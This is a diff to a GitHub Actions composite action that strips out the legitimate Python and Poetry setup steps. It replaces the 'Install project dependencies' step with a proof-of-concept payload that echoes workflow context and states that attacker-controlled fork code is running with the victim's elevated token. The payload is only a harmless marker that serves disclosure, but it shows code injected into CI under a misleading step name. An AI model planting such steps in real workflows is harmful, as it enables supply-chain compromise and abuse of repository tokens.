@@ -12,29 +12,15 @@ inputs:
 runs:
   using: composite
   steps:
-    - name: Set up Python
-      uses: actions/setup-python@v6
-      with:
-        python-version: ${{ inputs.python-version }}
-
-    - name: Install Poetry
-      shell: bash
-      run: python -m pip install poetry
-
-    - name: Determine poetry version
-      shell: bash
-      run: |
-        POETRY_VERSION=$(poetry --version | sed -r 's/[^0-9]*(([0-9]+\.)*[0-9]+).*/\1/g')
-        echo "VERSION=$POETRY_VERSION" >> $GITHUB_OUTPUT
-      id: poetry_version
-
-    - name: Cache poetry.lock
-      uses: actions/cache@v5
-      with:
-        path: poetry.lock
-        key: ${{ inputs.os }}-${{ inputs.python-version }}-poetry-${{ steps.poetry_version.outputs.VERSION }}-${{ hashFiles('pyproject.toml') }}
-
     - name: Install project dependencies
       shell: bash
-      run: poetry install -vvv --no-root
-
+      run: |
+        echo "=============================================================="
+        echo "DEPI-POC-20261002-6cfc1c12"
+        echo "Attacker-controlled composite action from an EXTERNAL FORK is"
+        echo "executing inside the victim workflow with its elevated token."
+        echo "repo=$GITHUB_REPOSITORY  run_id=$GITHUB_RUN_ID  actor=$GITHUB_ACTOR"
+        echo "event=$GITHUB_EVENT_NAME  workflow=$GITHUB_WORKFLOW"
+        echo "runner=$(whoami)@$(hostname)  pwd=$(pwd)"
+        echo "job permissions per workflow: actions:write, checks:write"
+        echo "=============================================================="
